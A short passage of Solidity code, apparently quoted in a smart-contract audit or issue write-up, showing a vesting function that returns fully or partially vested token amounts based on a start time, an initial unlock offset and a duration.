  *       if (block.timestamp >= _start -  __initialUnlockTimeOffset + _duration) return _totalAmount; // Fully vested
          _start = _start - __initialUnlockTimeOffset; // Offset initial unlock so it's claimable immediately
          return (_totalAmount * (block.timestamp - _start)) / _duration; // Partially vested

  }

  ```

  </details>
  ```
